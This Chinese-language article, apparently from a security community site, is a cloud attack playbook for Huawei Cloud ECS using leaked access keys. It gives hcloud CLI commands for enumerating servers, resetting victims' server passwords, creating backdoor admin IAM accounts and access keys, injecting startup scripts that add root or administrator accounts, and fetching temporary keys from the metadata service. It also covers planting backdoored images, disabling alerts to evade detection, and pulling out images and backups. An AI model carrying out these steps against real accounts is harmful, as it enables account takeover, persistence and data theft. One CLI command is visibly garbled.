---
title: 华为云 ECS 弹性计算服务攻防
id: huaweicloud_ecs
---

下面所讲的大部分操作是基于拿到华为云用户泄漏的AK SK或者凭证而进行的一系列操作。

<!-- more -->

目录：
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649661586-382341-image.png)

## 0x01、初始访问
### 1、元数据
华为云元数据地址：http://169.254.169.254，需要注意直接访问是看不到openstack目录的，下面列举几个常见的目录

`
/latest/meta-data/local-ipv4 #用于查询弹性云服务器的固定IP地址。多网卡情况下，只显示主网卡的地址。
/latest/meta-data/hostname #用于查询弹性云服务器的主机名称，后面会追加.novalocal后缀
/latest/meta-data/instance-type #用于查询弹性云服务器的规格名称。 
/latest/meta-data/placement/availability-zone #用于查询弹性云服务器的AZ信息。
/latest/meta-data/public-keys/0/openssh-key #用于查询弹性云服务器的公钥
/openstack/latest/meta_data.json  #用于查询弹性云服务器的元数据
/openstack/latest/user_data  #用于查询弹性云服务器的自定义数据。
/openstack/latest/network_data.json #查询弹性云服务器的网络信息，支持查询云服务器挂载的全部网卡的信息，包括网卡所在子网的DNS地址、网络带宽、网卡ID、网卡私有IP地址、网卡弹性公网IP地址、网卡的MAC地址。
/openstack/latest/securitykey #获取临时的AK、SK`

### 2、凭证泄漏
- 控制台账号密码泄露，例如登录控制台的账号密码（主账号异地登录需要验证码，IAM账号登录只需要用户名和密码）
- 临时凭证泄露
- 访问密钥泄露，即 AccessKeyId、SecretAccessKey 泄露

### 3、账号劫持
云平台本身的漏洞，可以劫持其他用户的账号
华为云api explorer会给每个用户分配一台docker机器，大家可以研究下是否可以提权、逃逸从而进入别人的容器中
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649648863-638903-image.png)

### 4、网络钓鱼
通过向管理员或运维人员发送钓鱼邮件、社工来获取用户凭证

## 0x02、命令执行
### 1、接管控制台
如果AK/SK的权限够高，就可以创建同权限的账号来达到接管控制台，在下面的第3章的第2节我们会讲到这个
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649649893-921366-image.png)
### 2、服务器命令
很遗憾，华为云ECS只有登录服务器才可以执行命令，哪怕拿到了账号登录控制台也需要服务器的账号密码
但是拿到泄漏的AK SK可以控制服务器的关机启动和修改密码（动静太大），下面介绍下拿到AK/SK如何修改服务器密码和开关机
首先我们需要利用云服务器的地区和终端节点来爆破用户拥有的服务器
https://developer.huaweicloud.com/endpoint  #官方地区和终端节点
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649649978-718063-image.png)

`hcloud ECS ListServersDetails --cli-region="cn-south-1"  #切换区域ID查询服务器`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650004-49112-image.png)
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650015-564984-image.png)
需要用到id（命令里的server_id）和tenant_id（命令里的project_id）
修改密码
`#企业版
hcloud ECS ResetServerPassword --cli-region="cn-south-1" --project_id="0a8453d1f12b8531" --server_id="1fb786129411ab1c" --reset-password.is_check_password=true --reset-password.new_password="1234qwer"`

`#个人版
hcloud ECS BatchResetServersPassword --cli-region="cn-south-1" --project_id="0a8453d112b8531" --servers.1.id="1fb786d9-a294-11c" --new_password="1234qwer"`

启动服务器

`hcloud ECS BatchStartServers --cli-region="cn-south-1" --project_id="0a8453d1f7121283b8531" --os-start.servers.1.id="1fb786d9-5121ab1c"`

关闭服务器

`hcloud ECS BatchStopServers --cli-region="cn-south-1" --project_id="0a8453d112c00e683b8531" --os-stop.servers.1.id="hcloud ECS BatchStartServers" --cli-region="cn-south-1" --project_id="0a8453d1f121200e683b8531" --os-start.servers.1.id="1fb7121-4958-a294-41224e1ab1c""`

华为云购买服务器时默认的账号为root权限，如果用户未做权限限制，拿到shell就不用提权了
### 3、利用后门文件
任意文件上传，文件包含，解析漏洞等
### 4、利用远程代码执行漏洞 
fastjson反序列化，shiro反序列化等等
### 5、SSH账号密码泄漏等

## 0x03、权限维持
此处就只演示使用华为云cli如何操作，控制台如何操作就没必要演示了
### 1、新增服务器
新建一台指定网段的服务器来作为跳板机

`hcloud ECS CreatePostPaidServers --cli-region="cn-south-1" --project_id="0a8453d1f700250e2f02c00e683b8531" --server.data_volumes.1.volumetype="SSD" --server.data_volumes.1.size=40 --server.vpcid="123456" --server.name="huoxian" --server.nics.1.subnet_id="12345" --server.root_volume.volumetype="SSD" --server.root_volume.size=40 --server.flavorRef="12" --server.imageRef="123" --server.user_data="#! /bin/bash echo user_test >> /home/user.txt"`

这里解释下里面参数的意义和如何拿到这个参数，带*的参数是需要其他命令获取的

`--cli-region  #地区
--project_id #用户ID，前面有介绍
 --server.data_volumes.1.volumetype #云服务器数据盘对应的磁盘类型,需要与系统所提供的磁盘类型相匹配
--server.data_volumes.1.size=40 #磁盘大小
--server.vpcid="123" #vpc的ID*
--server.name #云服务器名称
--server.nics.1.subnet_id #待创建云服务器所在的子网信息*
--server.root_volume.volumetype #云服务器系统盘对应的磁盘类型,需要与系统所提供的磁盘类型相匹配
 --server.root_volume.size=40 #磁盘大小
--server.flavorRef #待创建云服务器的系统规格的ID*
--server.imageRef #待创建云服务器的系统镜像*
--server.user_data #创建云服务器过程中待注入用户数据`

查询VPC列表

`hcloud VPC ListVpcs/v3 --cli-region="cn-south-1" --project_id="0a8451200e683b8531"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650388-49949-image.png)
查询地址组列表

`hcloud VPC ListAddressGroup/v3 --cli-region="cn-south-1" --project_id="0a845123b8531"`

查询规格详情和规格扩展信息列表

`hcloud ECS ListFlavors --cli-region="cn-south-1" --project_id="0a8453d1123b8531"`

查询镜像列表

`hcloud IMS ListImages --cli-region="cn-south-1"`

这样就可以创建一台指定密码、指定网段的服务器，可以当作跳板机

### 2、新增账号
需要注意的是密码得强规则

`hcloud IAM CreateUser --cli-region="cn-south-1" --user.domain_id="0a845312120e3d660" --user.pwd_status=false --user.name="test" --user.access_mode="console:" --user.enabled=true`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650498-520358-image.png)
--user.domain_id #参数从下面命令中获取

`hcloud IAM KeystoneListAuthDomains --cli-region="cn-south-1"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650531-836496-image.png)
其他参数意义

`--user.pwd_status #新增账号后初次登陆不需要修改密码，默认为true
--user.access_mode #账号权限 
    default:默认访问模式,编程访问和管理控制台访问。
    programmatic:编程访问。
    console:管理控制台访问。
--user.enabled #是否启用账号，默认为true`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650570-736712-image.png)

还有一种添加命令，只不过该命令无法指定邮箱和手机号码

`hcloud IAM KeystoneCreateUser --cli-region="cn-south-1" --user.password="123123" --user.name="huox"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650603-107414-image.png)

当我们添加了账号后，还需要给当前账号添加用户组

`hcloud IAM KeystoneAddUserToGroup --cli-region="cn-south-1" --group_id="0a84535a9380f2343fdcc00e38def544" --user_id="642195374d894c0cab5c3f00c57226c9"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650631-913547-image.png)

此处需要group_id，从下面获取；此处需要注意的是我们要看好用户组的具体权限，一般admin是默认的超级管理员权限

`hcloud IAM KeystoneListGroups --cli-region="cn-south-1"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650658-513308-image.png)
返回控制台看下
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650677-346878-image.png)
接下来就是登录控制台了
登录地址：https://auth.huaweicloud.com/authui/login?id=stay0D
使用刚才创建的账号登录控制台
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650700-6930-image.png)
可以看到已经是超级管理员了
关于登录地址，我们在查看用户详情的时候会看到用户的name，上面查到的就是stay0D，我们只需要把这个拼接到URL中id参数后就可以，所有添加的IAM账户，包括子账号添加的账号也是用同样的登录地址

### 3、新增AK/SK
我们可以新添加用户的AK/SK（限制是每个账号只能拥有两个密钥）

`hcloud IAM CreatePermanentAccessKey --cli-region="cn-south-1" --credential.user_id="90f761284f49953f"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650918-775087-image.png)

`--credential.user_id #用户ID`

获取用户ID从下面获取

`hcloud IAM KeystoneListUsers --cli-region="cn-south-1"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650947-171295-image.png)

`hcloud IAM DeletePermanentAccessKey --cli-region="cn-south-1" --access_key="xxxxxxx"`

### 4、镜像服务
我们可以删除，或者创建同名的镜像文件，将后门植入到镜像中，当用户使用镜像新建实例的时候，就会带入我们植入的恶意代码了
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649650979-908200-image.png)

### 5、远程软件控制
Windows——向日葵RCE

## 0x04、权限提升
华为云ECS Linux默认为root权限，需谨慎配置；其他提权姿势和常规提权一样

## 0x05、防御饶过
### 1、关闭告警通知
当我们进行入侵的时候，可以关闭掉告警通知，尤其实时告警，可以延长我们入侵被发现的时间，需要注意的是，告警只能通过控制台操作，无API
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651016-938680-image.png)

### 2、关闭订阅
本来想的是修改账号联系人的信息，邮箱和手机号码，但是修改时需要验证码，行不通，但是我们也可以修改订阅管理，关闭掉所有的通知消息
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651038-490402-image.png)

## 0x06、信息搜集
### 1、元数据
##### a、自定义数据
其中 openstack/latest/password 可查询弹性云服务器的密码，Windows系统使用keypairs创建弹性云服务器初始化时cloudbase-init用于保存密文密码。
openstack/latest/user_data 可查询弹性云服务器的自定义数据，这里简单介绍下这个文件能干什么
在创建云服务器的时候，有一个选项是实例自定义数据注入，什么时候会用到这个呢，当我们需要创建多个服务器的时候，为了方便管理，需要对网络和密码等进行统一操作
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651081-650444-image.png)
这里我们可以插入我们想要在服务器刚创建时执行命令，比如创建自定义的密码

`#!/bin/bash 
echo 'root:$6$V6azyeLwcD3CHlpY$BN3VVq18fmCkj66B4zdHLWevqcxlig' | chpasswd -e;`

或者需要执行的其他命令，而user_data文件中数据就是上面的命令，如果选择了实例自定义数据注入，就会从元数据中看到这些数据

`#Windows
rem cmd
net user abc password /add
net localgroup administrators abc /add`

注意的是实例自定义数据注入只有创建服务器的时候才会有，后续无法进行修改

##### b、临时的AK、SK

`http://169.254.169.254/openstack/latest/securitykey #获取临时的AK、SK`

临时的AK、SK有效期一个小时，拿到后通过华为云cli可以进行进一步的利用，包括新建账号、服务器等操作，如上面第3章有所讲述；需注意的是华为云元数据没有用户临时token

### 2、获取服务器实例登录账号
可以使用mimikatz等工具抓取windows服务器的凭证

### 3、镜像服务
如果用户在制作整机镜像时未将敏感数据删除，那我们就可以将镜像导出到OBS桶中，然后下载到本地重新搭建，在其中寻找一些敏感数据
首先看下用户制作的镜像，然后将私有镜像导出到OBS桶中
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651197-840054-image.png)
然后访问存储桶下载或者从控制台下载
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651210-772129-image.png)
下载后通过VMware等其他软件打开就可以，在信息搜集的时候可以留意一下

### 4、云备份共享
将对方的云备份共享至自己的账号（只能在控制台操作）
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651263-942775-image.png)

## 0x07、横向移动
### 1、子网信息
通过网络控制台-虚拟私有云查看具体网段信息
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649651997-225131-image.png)
或者使用华为云cli查看

`hcloud VPC ListVpcs/v3 --cli-region="cn-south-1" --project_id="0a8453d1f700250e2f02c00e683b8531"`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649652021-927557-image.png)
也可查看元数据猜测（不全）

`http://169.254.169.254/openstack/latest/network_data.json #元数据猜C段`

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649652046-992798-image.png)

### 2、访问凭证
- 拿到账号密码登录实例
- 修改实例密码后登录
- 新建同网段服务器

### 3、负载均衡
如果内网机器无法出网且对方有使用负载均衡，我们登录控制台后可以将内网的指定端口通过负载均衡映射到公网
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649652083-983284-image.png)
首先需要添加监听器，输入公网前端端口（就是我们直接访问的端口）和后端分配的端口（内网服务器的端口），然后在后端服务器组添加内网的服务器就可以了
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649652096-26046-image.png)
这就是最终的效果，通过ELB让内网机器出网

## 0x08、影响
### 1、子域名接管
其实就是实例销毁后未将域名解析到正确的IP
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-11/1649652131-148965-image.png)
上面就是某SRC厂商的失误操作，导致子域名解析到一台个人服务器上，就是这个IP归属无法控制
### 2、资源劫持
肉鸡，挖矿等

## 0x09、总结

师傅们可以对照着前几位师傅的文章观看
https://zone.huoxian.cn/d/1064-ecs  #阿里云
https://zone.huoxian.cn/d/1028-cvm  #腾讯云
https://zone.huoxian.cn/d/1022-aws-ec2 #AWS
https://zone.huoxian.cn/d/1043-compute-engine  #谷歌云
